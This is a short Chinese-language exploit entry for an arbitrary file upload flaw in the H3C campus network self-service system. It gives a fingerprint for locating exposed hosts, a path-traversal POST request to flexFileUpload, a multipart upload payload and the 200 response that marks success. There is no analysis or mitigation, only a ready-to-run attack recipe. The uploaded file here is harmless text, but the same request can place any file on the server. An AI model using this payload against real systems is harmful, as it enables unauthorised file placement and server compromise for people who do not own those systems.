# H3C校园网自助服务系统flexfileupload任意文件上传

H3C ｜ 文件上传 ｜ —
- **指纹**：`header="/selfservice"`
- **请求**：`POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1`

**Payload**
```
-----------------WebKitFormBoundaryMmx988TUuintqO4Q
Content-Disposition: form-data; name="dudesite.txt"; filename="dudesite.txt"
Content-Type: application/octet-stream
dudesite
-----------------WebKitFormBoundaryMmx988TUuintqO4Q--
```
- **响应特征**：200